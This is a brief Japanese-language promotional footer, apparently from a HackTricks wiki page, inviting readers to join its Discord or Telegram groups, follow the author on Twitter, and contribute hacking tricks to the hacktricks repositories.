* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
